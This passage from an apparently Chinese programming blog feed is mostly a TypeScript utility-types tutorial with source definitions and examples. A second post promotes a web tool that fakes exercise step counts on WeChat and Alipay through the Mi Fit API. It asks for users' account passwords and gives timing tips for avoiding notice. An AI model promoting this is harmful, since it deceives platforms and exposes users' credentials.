string">"Persian"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  boris<span class="token punctuation">:</span> <span class="token punctuation">{</span> age<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> breed<span class="token punctuation">:</span> <span class="token string">"Maine Coon"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>  mordred<span class="token punctuation">:</span> <span class="token punctuation">{</span> age<span class="token punctuation">:</span> <span class="token number">16</span><span class="token punctuation">,</span> breed<span class="token punctuation">:</span> <span class="token string">"British Shorthair"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// const cats: Record&lt;CatName, CatInfo></span>cats<span class="token punctuation">.</span>boris<span class="token punctuation">;</span></code></pre><h2 id="Pick-lt-Type-Keys-gt"><a href="#Pick-lt-Type-Keys-gt" class="headerlink" title="Pick&lt;Type, Keys&gt;"></a>Pick&lt;Type, Keys&gt;</h2><p>将 <code>Type</code> 的部分类型 <code>Keys</code> 挑出来，返回这部分类型。（拣选属性）</p><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Pick<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> K <span class="token keyword">extends</span> <span class="token class-name">keyof</span> T<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token punctuation">[</span>P <span class="token keyword">in</span> K<span class="token punctuation">]</span><span class="token punctuation">:</span> T<span class="token punctuation">[</span>P<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h3 id="例-4"><a href="#例-4" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">Todo</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span>  description<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span>  completed<span class="token punctuation">:</span> <span class="token keyword">boolean</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// type TodoPreview = { title: string, completed: boolean }</span>type TodoPreview <span class="token operator">=</span> Pick<span class="token operator">&lt;</span>Todo<span class="token punctuation">,</span> <span class="token string">"title"</span> <span class="token operator">|</span> <span class="token string">"completed"</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">const</span> todo<span class="token punctuation">:</span> TodoPreview <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">"Clean room"</span><span class="token punctuation">,</span>  completed<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// const todo: TodoPreview</span>todo<span class="token punctuation">;</span></code></pre><h2 id="Omit-lt-Type-Keys-gt"><a href="#Omit-lt-Type-Keys-gt" class="headerlink" title="Omit&lt;Type, Keys&gt;"></a>Omit&lt;Type, Keys&gt;</h2><p>移除 <code>Type</code> 类型中的 <code>Keys</code> 类型，返回新的类型。和 <code>Pick</code> 含义相对。</p><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Omit<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> K <span class="token keyword">extends</span> <span class="token class-name">keyof</span> <span class="token keyword">any</span><span class="token operator">></span> <span class="token operator">=</span> Pick<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> Exclude<span class="token operator">&lt;</span>keyof T<span class="token punctuation">,</span> K<span class="token operator">></span><span class="token operator">></span><span class="token punctuation">;</span></code></pre><h3 id="例-5"><a href="#例-5" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">Todo</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span>  description<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">;</span>  completed<span class="token punctuation">:</span> <span class="token keyword">boolean</span><span class="token punctuation">;</span>  createdAt<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">;</span><span class="token punctuation">}</span>type TodoPreview <span class="token operator">=</span> Omit<span class="token operator">&lt;</span>Todo<span class="token punctuation">,</span> <span class="token string">"description"</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">const</span> todo<span class="token punctuation">:</span> TodoPreview <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">"Clean room"</span><span class="token punctuation">,</span>  completed<span class="token punctuation">:</span> <span class="token keyword">false</span><span class="token punctuation">,</span>  createdAt<span class="token punctuation">:</span> <span class="token number">1615544252770</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span>todo<span class="token punctuation">;</span><span class="token keyword">const</span> todo<span class="token punctuation">:</span> TodoPreviewtype TodoInfo <span class="token operator">=</span> Omit<span class="token operator">&lt;</span>Todo<span class="token punctuation">,</span> <span class="token string">"completed"</span> <span class="token operator">|</span> <span class="token string">"createdAt"</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token keyword">const</span> todoInfo<span class="token punctuation">:</span> TodoInfo <span class="token operator">=</span> <span class="token punctuation">{</span>  title<span class="token punctuation">:</span> <span class="token string">"Pick up kids"</span><span class="token punctuation">,</span>  description<span class="token punctuation">:</span> <span class="token string">"Kindergarten closes at 5pm"</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// const todoInfo: TodoInfo</span>todoInfo<span class="token punctuation">;</span></code></pre><h2 id="Exclude-lt-Type-ExcludedUnion-gt"><a href="#Exclude-lt-Type-ExcludedUnion-gt" class="headerlink" title="Exclude&lt;Type, ExcludedUnion&gt;"></a>Exclude&lt;Type, ExcludedUnion&gt;</h2><p>从 <code>Type</code> 中排除可分配给 <code>ExcludedUnion</code> 的属性，剩余的属性构成新的类型</p><h3 id="源码-5"><a href="#源码-5" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Exclude<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> U<span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token class-name">U</span> <span class="token operator">?</span> never <span class="token punctuation">:</span> T<span class="token punctuation">;</span></code></pre><h3 id="例-6"><a href="#例-6" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token comment" spellcheck="true">// T0 = "b" | "c"</span>type T0 <span class="token operator">=</span> Exclude<span class="token operator">&lt;</span><span class="token string">"a"</span> <span class="token operator">|</span> <span class="token string">"b"</span> <span class="token operator">|</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token operator">></span><span class="token punctuation">;</span></code></pre><h2 id="Extract-lt-Type-Union-gt"><a href="#Extract-lt-Type-Union-gt" class="headerlink" title="Extract&lt;Type, Union&gt;"></a>Extract&lt;Type, Union&gt;</h2><p>从 <code>Type</code> 中抽出可分配给 <code>Union</code> 的属性构成新的类型(交集)。与Exclude相反。</p><h3 id="源码-6"><a href="#源码-6" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Extract<span class="token operator">&lt;</span>T<span class="token punctuation">,</span> U<span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token class-name">U</span> <span class="token operator">?</span> T <span class="token punctuation">:</span> never<span class="token punctuation">;</span></code></pre><h3 id="例-7"><a href="#例-7" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token comment" spellcheck="true">// T0 = "a"</span>type T0 <span class="token operator">=</span> Extract<span class="token operator">&lt;</span><span class="token string">"a"</span> <span class="token operator">|</span> <span class="token string">"b"</span> <span class="token operator">|</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"a"</span> <span class="token operator">|</span> <span class="token string">"f"</span><span class="token operator">></span><span class="token punctuation">;</span></code></pre><h2 id="NonNullable"><a href="#NonNullable" class="headerlink" title="NonNullable"></a>NonNullable<Type></h2><p>Type 类型中移除 <code>null</code> 和 <code>undefined</code></p><h3 id="源码-7"><a href="#源码-7" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type NonNullable<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token class-name">null</span> <span class="token operator">|</span> undefined <span class="token operator">?</span> never <span class="token punctuation">:</span> T<span class="token punctuation">;</span></code></pre><h3 id="例-8"><a href="#例-8" class="headerlink" title="例"></a>例</h3><p>// T0 = string | number</p><pre class=" language-ts"><code class="language-ts">type T0 <span class="token operator">=</span> NonNullable<span class="token operator">&lt;</span><span class="token keyword">string</span> <span class="token operator">|</span> <span class="token keyword">number</span> <span class="token operator">|</span> undefined<span class="token operator">></span><span class="token punctuation">;</span></code></pre><h2 id="Parameters"><a href="#Parameters" class="headerlink" title="Parameters"></a>Parameters<Type></h2><p>Type 是函数类型，返回函数的参数。</p><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type Parameters<span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">any</span><span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> infer P<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">any</span> <span class="token operator">?</span> P <span class="token punctuation">:</span> never<span class="token punctuation">;</span></code></pre><h3 id="例-9"><a href="#例-9" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">declare</span> <span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span>arg<span class="token punctuation">:</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">void</span>type T0 <span class="token operator">=</span> Parameters<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">string</span><span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// []</span>type T1 <span class="token operator">=</span> Parameters<span class="token operator">&lt;</span><span class="token punctuation">(</span>s<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">void</span><span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// [string]</span>type T2 <span class="token operator">=</span> Parameters<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span>arg<span class="token punctuation">:</span> T<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> T<span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// [unknown]</span>type T4 <span class="token operator">=</span> Parameters<span class="token operator">&lt;</span><span class="token keyword">typeof</span> f1<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// [{ a: number, b: string }]</span>type T5 <span class="token operator">=</span> Parameters<span class="token operator">&lt;</span><span class="token keyword">any</span><span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// unknown[]</span>type T6 <span class="token operator">=</span> Parameters<span class="token operator">&lt;</span>never<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// never</span></code></pre><h2 id="ReturnType"><a href="#ReturnType" class="headerlink" title="ReturnType"></a>ReturnType<Type></h2><p>Type 是函数类型，返回 Type 的返回值</p><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type ReturnType<span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">any</span><span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> infer R <span class="token operator">?</span> R <span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">;</span></code></pre><h3 id="例-10"><a href="#例-10" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">declare</span> <span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token punctuation">{</span> a<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">;</span> b<span class="token punctuation">:</span> <span class="token keyword">string</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// T0 = string</span>type T0 <span class="token operator">=</span> ReturnType<span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">string</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// T1 = void</span>type T1 <span class="token operator">=</span> ReturnType<span class="token operator">&lt;</span><span class="token punctuation">(</span>s<span class="token punctuation">:</span> <span class="token keyword">string</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">void</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// T2 = unknown</span>type T2 <span class="token operator">=</span> ReturnType<span class="token operator">&lt;</span><span class="token operator">&lt;</span>T<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> T<span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// T3 = number[]</span>type T3 <span class="token operator">=</span> ReturnType<span class="token operator">&lt;</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">,</span> U <span class="token keyword">extends</span> <span class="token class-name">number</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> T<span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// T4 = { a: number; b: string }</span>type T4 <span class="token operator">=</span> ReturnType<span class="token operator">&lt;</span><span class="token keyword">typeof</span> f1<span class="token operator">></span><span class="token punctuation">;</span></code></pre><h2 id="InstanceType"><a href="#InstanceType" class="headerlink" title="InstanceType"></a>InstanceType<Type></h2><p>返回构造函数类型 <code>Type</code> 的实例类型</p><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type InstanceType<span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">new</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">any</span><span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token class-name">new</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> infer R <span class="token operator">?</span> R <span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">;</span></code></pre><h3 id="例-11"><a href="#例-11" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">class</span> <span class="token class-name">C</span> <span class="token punctuation">{</span>  x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// type T0 = C</span>type T0 <span class="token operator">=</span> InstanceType<span class="token operator">&lt;</span><span class="token keyword">typeof</span> C<span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// type T1 = any</span>type T1 <span class="token operator">=</span> InstanceType<span class="token operator">&lt;</span><span class="token keyword">any</span><span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  type T2 = never    </span>type T2 <span class="token operator">=</span> InstanceType<span class="token operator">&lt;</span>never<span class="token operator">></span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Type 'string' does not satisfy the constraint 'abstract new (...args: any) => any'. </span>type T3 <span class="token operator">=</span> InstanceType<span class="token operator">&lt;</span><span class="token keyword">string</span><span class="token operator">></span><span class="token punctuation">;</span></code></pre><h2 id="ThisParameterType"><a href="#ThisParameterType" class="headerlink" title="ThisParameterType"></a>ThisParameterType<Type></h2><p>返回函数的 <code>this</code> 参数类型，如果不是 <code>this</code>，返回 <code>unknow</code> 类型。</p><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type ThisParameterType<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span> T <span class="token keyword">extends</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">:</span> infer U<span class="token punctuation">,</span> <span class="token operator">...</span>args<span class="token punctuation">:</span> <span class="token keyword">any</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">any</span> <span class="token operator">?</span> U <span class="token punctuation">:</span> unknown<span class="token punctuation">;</span></code></pre><h3 id="例-12"><a href="#例-12" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">function</span> <span class="token function">toHex</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">:</span> Number<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// n:number</span><span class="token keyword">function</span> <span class="token function">numberToString</span><span class="token punctuation">(</span>n<span class="token punctuation">:</span> ThisParameterType<span class="token operator">&lt;</span><span class="token keyword">typeof</span> toHex<span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> toHex<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">add</span><span class="token punctuation">(</span>a<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> b<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> a <span class="token operator">+</span> b<span class="token punctuation">}</span><span class="token comment" spellcheck="true">// unknown</span>type addParamerType <span class="token operator">=</span> ThisParameterType<span class="token operator">&lt;</span><span class="token keyword">typeof</span> add<span class="token operator">></span></code></pre><h2 id="OmitThisParameter"><a href="#OmitThisParameter" class="headerlink" title="OmitThisParameter"></a>OmitThisParameter<Type></h2><p>如果一个函数有指定的 <code>this</code> 类型，那么返回一个不带 <code>this</code> 类型的函数类型，否则还是返回原来的函数。</p><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts">type OmitThisParameter<span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">=</span> unknown <span class="token keyword">extends</span> <span class="token class-name">ThisParameterType</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token operator">?</span> T <span class="token punctuation">:</span> T <span class="token keyword">extends</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> infer A<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> infer R <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token operator">...</span>args<span class="token punctuation">:</span> A<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> R <span class="token punctuation">:</span> T<span class="token punctuation">;</span></code></pre><h3 id="例-13"><a href="#例-13" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">function</span> <span class="token function">toHex</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">:</span> Number<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// () => string</span><span class="token keyword">const</span> fiveToHex<span class="token punctuation">:</span> OmitThisParameter<span class="token operator">&lt;</span><span class="token keyword">typeof</span> toHex<span class="token operator">></span> <span class="token operator">=</span> toHex<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="ThisType"><a href="#ThisType" class="headerlink" title="ThisType"></a>ThisType<Type></h2><p><code>ThisType</code> 不会返回一个转换之后的类型，提供基于上下文的 <code>this</code> 类型。注意，需要开启 <code>--noImplicitThis</code> 特性。</p><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><pre class=" language-ts"><code class="language-ts"><span class="token keyword">interface</span> <span class="token class-name">ThisType</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span> <span class="token punctuation">}</span></code></pre><h3 id="例-14"><a href="#例-14" class="headerlink" title="例"></a>例</h3><pre class=" language-ts"><code class="language-ts">type ObjectDescriptor<span class="token operator">&lt;</span>D<span class="token punctuation">,</span> M<span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">{</span>    data<span class="token operator">?</span><span class="token punctuation">:</span> D<span class="token punctuation">;</span>    methods<span class="token operator">?</span><span class="token punctuation">:</span> M <span class="token operator">&amp;</span> ThisType<span class="token operator">&lt;</span>D <span class="token operator">&amp;</span> M<span class="token operator">></span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Type of 'this' in methods is D &amp; M</span><span class="token punctuation">}</span><span class="token keyword">function</span> makeObject<span class="token operator">&lt;</span>D<span class="token punctuation">,</span> M<span class="token operator">></span><span class="token punctuation">(</span>desc<span class="token punctuation">:</span> ObjectDescriptor<span class="token operator">&lt;</span>D<span class="token punctuation">,</span> M<span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">:</span> D <span class="token operator">&amp;</span> M <span class="token punctuation">{</span>    <span class="token keyword">let</span> data<span class="token punctuation">:</span> object <span class="token operator">=</span> desc<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> methods<span class="token punctuation">:</span> object <span class="token operator">=</span> desc<span class="token punctuation">.</span>methods <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span> <span class="token operator">...</span>data<span class="token punctuation">,</span> <span class="token operator">...</span>methods <span class="token punctuation">}</span> as D <span class="token operator">&amp;</span> M<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token function">makeObject</span><span class="token punctuation">(</span><span class="token punctuation">{</span>    data<span class="token punctuation">:</span> <span class="token punctuation">{</span> x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>    methods<span class="token punctuation">:</span> <span class="token punctuation">{</span>        <span class="token function">moveBy</span><span class="token punctuation">(</span>dx<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">,</span> dy<span class="token punctuation">:</span> <span class="token keyword">number</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>x <span class="token operator">+</span><span class="token operator">=</span> dx<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Strongly typed this</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>y <span class="token operator">+</span><span class="token operator">=</span> dy<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// Strongly typed this</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>obj<span class="token punctuation">.</span><span class="token function">moveBy</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.typescriptlang.org/docs/handbook/utility-types.html" target="_blank" rel="noopener">TypeScript: Documentation - Utility Types</a></li><li><a href="https://zhuanlan.zhihu.com/p/120802610" target="_blank" rel="noopener">TypeScript Utility Types 学习笔记及源码解析 - 知乎</a></li><li><a href="https://jkchao.github.io/typescript-book-chinese/typings/thisType.html" target="_blank" rel="noopener">ThisType | 深入理解 TypeScript</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运动步数修改器 web 版本</title>
      <link href="/2021/05/22/front-end/sync-movement-steps/"/>
      <url>/2021/05/22/front-end/sync-movement-steps/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/16216988358049.jpg"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol><li>修改本地步数，比如健康的数据，比较麻烦，没有找到特别方便的方法。</li><li>摇步器，慢慢慢，工作时间内只能摇 20 公里左右</li><li>通过第三方同步数据，比如乐心健康，小米运动等通过接口同步到微星、支付宝等平台</li></ol><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>实现其实挺简单的，github 上面的代码也挺多，包括 nodejs 的实现，shell 的实现，python 的实现。<br>这里我们选择了 nodejs 的实现，前端使用 react + antd，后端使用 nestjs，使用时候，直接返回日志给用户，方便用户查看失败详情。<br>代码写的比较烂，就暂时不开源了。<br>访问地址：<a href="https://walk.jscoder.com/" target="_blank" rel="noopener">https://walk.jscoder.com/</a></p><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><ol><li>注册小米运动 app</li><li>小米运动 app，我的-第三方接入，设置接入的第三方平台，支持微信、QQ、支付宝、阿里体育</li><li><a href="https://walk.jscoder.com/" target="_blank" rel="noopener">https://walk.jscoder.com/</a> 输入小米运动的账号密码，需要的步数，点击确定</li></ol><h3 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h3><ol><li>不要频繁修改你的数据</li><li>不要在 0:00 ~ 5:00 这个时间段修改你的数据</li><li>我不会记录你的密码，但是依然建议你使用临时密码</li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/Devifish/sport-editor" target="_blank" rel="noopener">Devifish/sport-editor: 通过小米运动API实现的自动刷运动步数工具😒（可同步到微信、支付宝）</a></li><li><a href="https://github.com/mixool/mimotion" target="_blank" rel="noopener">mixool/mimotion: 小米运动 微信步数 支付宝步数</a></li><li><a href="https://github.com/lisztomania-Zero/SportsChange" target="_blank" rel="noopener">lisztomania-Zero/SportsChange: 微信、支付宝、QQ、阿里体育运动步数修改</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【支付宝小程序】我们常用的 &#39;my&#39; 是什么？</title>
      <link href="/2021/04/24/front-end/mini-my/"/>
      <url>/2021/04/24/front-end/mini-my/</url>
      
